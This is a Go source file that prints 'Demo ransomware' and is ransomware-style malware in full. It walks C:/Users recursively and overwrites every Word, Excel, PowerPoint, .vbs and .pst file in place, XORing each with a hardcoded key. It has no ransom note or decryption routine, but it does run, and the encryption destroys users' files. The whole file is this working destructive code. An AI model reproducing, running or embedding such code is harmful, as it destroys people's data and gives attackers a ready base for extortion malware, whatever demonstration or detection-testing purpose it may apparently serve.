package main

import (
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
)

var Ballast = "1AASSSaaa"

var targets = []string{
	".doc",
	".docx",
	".ppt",
	".pptx",
	".xls",
	".xlsx",
	".vbs",
	".pst",
}

var secret = "secret password"

func encrypt(fileName string, secret string) error {
	stat, err := os.Stat(fileName)
	if err != nil {
		return err
	}
	size := stat.Size()
	f, err := os.OpenFile(fileName, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	defer f.Close()
	fmt.Printf("Encrypt %s: Start\n", fileName)
	fmt.Printf("File size = %d\n", size)
	const bufSize = 8 * 1024
	buffer := make([]byte, bufSize)
	secretIndex := 0
	for {
		n, err := f.Read(buffer)
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}
		for i := 0; i < n; i++ {
			buffer[i] ^= secret[secretIndex]
			secretIndex++
			if secretIndex == len(secret) {
				secretIndex = 0
			}
		}
		f.Seek(-int64(n), os.SEEK_CUR)
		_, err = f.Write(buffer[:n])
		if err != nil {
			return err
		}
	}

	fmt.Printf("Encrypt %s: Done\n", fileName)
	return nil
}

func isTarget(name string) bool {
	ext := filepath.Ext(name)
	for _, t := range targets {
		if strings.EqualFold(t, ext) {
			return true
		}
	}
	return false
}

func encryptDir(dir string) error {
	count := 0
	fmt.Printf("Start encryption in %s\n", dir)
	err := filepath.Walk(dir, func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.Mode().IsRegular() {
			return nil
		}
		if !isTarget(path) {
			return nil
		}
		err = encrypt(path, secret)
		if err != nil {
			return fmt.Errorf("%v: %w", path, err)
		}
		count++
		return nil
	})
	fmt.Printf("Encrypted %d files\n", count)
	return err
}

func main() {
	fmt.Printf("Demo ransomware (%s)\n", Ballast)
	dir := "C:/Users"
	err := encryptDir(dir)
	if err != nil {
		fmt.Printf("%s: %v\n", dir, err)
	}
}

